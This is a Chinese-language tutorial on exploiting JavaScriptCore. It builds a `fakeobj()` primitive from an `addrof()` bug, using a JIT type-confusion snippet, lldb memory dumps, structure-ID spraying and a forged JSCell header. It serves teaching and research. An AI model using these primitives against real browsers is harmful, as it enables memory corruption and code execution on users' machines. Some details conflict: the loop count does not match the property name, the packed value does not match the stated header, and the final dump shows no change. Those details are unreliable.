### 优化后的文本

#### 原文链接
在本文中，我们将向读者介绍`fakeobj()`原语。该原语基于`addrof()`中的一个漏洞，攻击者可以利用它来破坏JavaScriptCore内部对象的内存空间。

## 简介
在前一篇文章中，我们介绍了如何泄露JavaScript对象的地址；而在本文中，我们将探讨如何利用这些泄露的信息来破坏相关的内存空间。为了更好地理解本文内容，您需要了解JavaScript对象在内存中的布局情况，包括内部属性和butterfly结构等。在这篇文章中，我们将利用这些知识将内存泄漏问题转化为内存破坏问题。

读者可能会好奇我们是如何实现这个转化过程的。实际上，这比简单的缓冲区溢出要复杂得多，因为这里无法直接控制指令指针。尽管这个漏洞的可利用性较差，但通过适当的技巧，我们可以发挥其强大的威力。

## `fakeobj` 原语
在saelo的相关[文章](http://phrack.org/papers/attacking_javascript_engines.html "文章")中，他提到了两个原语：`addrof` 和 `fakeobj`。在前面的文章中，我们已经介绍了如何利用 `addrof` 原语来泄露内存中对象的地址。现在，让我们来看看 `fakeobj` 原语的工作原理。

`fakeobj` 原语的工作机理与 `addrof` 原语正好相反。`fakeobj` 通过将本机双精度浮点数注入到 `JSValues` 数组中，从而创建 `JSObject` 指针。

请记住，在这篇文章中，`JSValues` 的存储格式如下：
- 指针：`0000:PPPP:PPPP:PPPP`
- 双精度浮点数：`0001:****:****:****`
- 整数：`FFFF:0000:IIII:IIII`

当我们将一个JavaScript对象添加到数组中时，实际存储的是该对象的地址。因此，如果 `addrof` 原语是将指向对象的指针作为双精度浮点数读取，那么 `fakeobj` 原语则是将双精度浮点数解释为指向对象的指针。

让我们复制 `addrof` 代码并进行相应的改造：

```javascript
// 
// fakeobj 原语
// 注释中的数字表示下面列出的步骤
function fakeobj(dbl) { // (1) & (2)
  var array = [13.37];
  var reg = /abc/y;
  // 目标函数
  var AddrSetter = function(array) { // (4)
    "abc".match(reg);
    array[0] = dbl; // (3)
  }
  // 强制优化
  for (var i = 0; i < 10000; i++) {
    AddrSetter(array);
  }
  return array[0];
}
```

为了简化起见，我们将创建一个只有一个属性 `x` 的对象，该属性是一个简单的整数。

```javascript
>>> test = {}
[object Object]
>>> test.x = 1
1
>>> describe(test)
Object: 0x62d0000d4080 with butterfly 0x0 (Structure 0x62d000188310: [...])
# 按下 CTRL + C
(lldb) x/4gx 0x62d0000d4080
0x62d0000d4080: 0x0100160000000126 0x0000000000000000
0x62d0000d4090: 0xffff000000000001 0x0000000000000000
```

通过观察这个对象，我们发现 `0x0100160000000126` 包含一些标志和结构ID，它们一起组成了 `JSCell` 头部。之后是一个由空值（`0x0`）组成的 `butterfly` 结构，后跟内联属性 `x`，我们将其设置为32位整数，其值为1。请记住这些特点，接下来我们将开始伪造这样的对象。

在这个漏洞利用方法中，一个亮点是我们可以利用这样一个事实：对象的前几个属性是内联属性，并且不会放入 `butterfly` 结构中。现在，让我们看看这个对象在内存中的布局情况。特别需要注意属性1、2、3：

```javascript
>>> fake = {}
[object Object]
>>> fake.a = 1
1
>>> fake.b = 2
2
>>> fake.c = 3
3
>>> describe(fake)
Object: 0x62d0000d40c0 with butterfly 0x0 ...
# 按下 CTRL + C
(lldb) x/6gx 0x62d0000d40c0
0x62d0000d40c0: 0x0100160000000129 0x0000000000000000
0x62d0000d40d0: 0xffff000000000001 0xffff000000000002
0x62d0000d40e0: 0xffff000000000003 0x0000000000000000
```

接下来，我们开始对这个原语进行测试。为此，我们可以使用 `addrof` 来获取其地址，然后针对这个地址使用 `fakeobj` 原语。这意味着 `hax` 对象现在应该与 `fake` 对象完全相同。

```javascript
>>> addrof(fake)
5.36780059573753e-310
>>> hax = fakeobj(5.36780059573753e-310)
[object Object]
>>> hax.a
1
>>> hax.b
2
>>> hax.c
3
>>> describe(hax)
Object: 0x62d0000d40c0 with butterfly 0x0 ...
>>> describe(fake)
Object: 0x62d0000d40c0 with butterfly 0x0 ...
```

太棒了，这样我们就能获得 `fake` 对象的地址，并使用 `fakeobj` 原语取回 `fake` 对象。这就是关键所在：我们可以完全控制JavaScript引擎，让它把双精度浮点数解释为指针。这意味着，如果我们给这个双精度浮点数加上一个小的偏移量（例如 `+0x10`），那么这个指针就会随之移动，并指向后面的内存位置。

如果我们现在使用 `fakeobj` 函数，JavaScript会认为新的偏移量是一个JavaScript对象，但在我们的例子中，它看起来不像是一个有效的JavaScript对象，因为它缺少标志、`butterfly` 结构和内部属性。由于我们已经可以控制内部属性，所以可以尝试创建一个有效的JavaScript对象。

首先，我们需要从标志和结构ID开始。如您所知，结构ID定义了对象中存在的属性。如果我们想用前面的属性 `x` 来伪造 `test` 对象，则需要使用 `test` 对象中的结构ID。

我们的 `test` 对象如下所示：

```
# 标志和结构ID | Butterfly
0x0100160000000126 0x0000000000000000
0xffff000000000001 0x0000000000000000
# 内联属性 `x`，值为 `1`
```

因此，我们希望将与真实结构ID匹配的假结构ID写入第一个属性。然而，这里并没有类似浏览器中的 `describe` 函数，那么我们如何在运行时读取 `test` 对象的结构ID呢？我们可以利用每次向对象添加新属性时都会创建一个新的结构并获得一个新的结构ID这一特性来猜测有效的结构ID。

我们可以创建许多含有属性 `x` 的测试对象，并通过添加其他属性来强制对象生成新的结构ID。基本上，我们就是对测试对象进行“喷射”操作。

```javascript
for (var i=0; i<1000; i++) {
  var test = {};
  test.x = 0;
  test["prop_" + i] = 1;
}
>>> describe(test)
Object: 0x62d00089d300 with butterfly 0x0 (Structure ...:[Object, {x:0, prop_4095:1} ...])
```

如果我们查看最后生成的 `test` 对象，我们会发现其中不仅含有 `x` 属性，还存在其他属性，但重点在于这里有一个较大的结构ID。因此，如果我们随机选择一个结构ID，比如说 `0x1000`，我们基本可以确定这对应于其中一个测试对象。从理论上讲，这也可能失败，即给出的结构ID并不对应于我们的目标测试对象，但通过喷射更多的对象，我们的成功概率会随之提高。

现在我们想要构造一个64位值 `0x0100160000000126`，这是我们的特殊标志和结构ID。因为我们要进行写操作的目标是双精度浮点数，所以我们需要先将这个64位整数转换为双精度浮点数。

```python
# 这是Python代码，不是jsc解释器
import struct
struct.pack("Q", 0x0100160000001000)
# 输出: b'\x00\x10\x00\x00\x00\x16\x00\x01'
struct.unpack("d", struct.pack("Q", 0x0100160000001000))
# 输出: (7.330283319472755e-304,)
```

现在，这个双精度浮点数将成为我们 `fake` 对象的有效 `JSCell` 头部，同时我们可以将它赋值给属性 `a`。

```javascript
>>> fake.a = 7.330283319472755e-304
7.330283319472755e-304
>>> describe(fake)
Object: 0x62d0000d40c0
# 按下 CTRL + C
(lldb) x/6gx 0x62d0000d40c0
0x62d0000d40c0: 0x0100160000000129 0x0000000000000000
```

通过这种方式，我们成功地伪造了一个有效的JavaScript对象。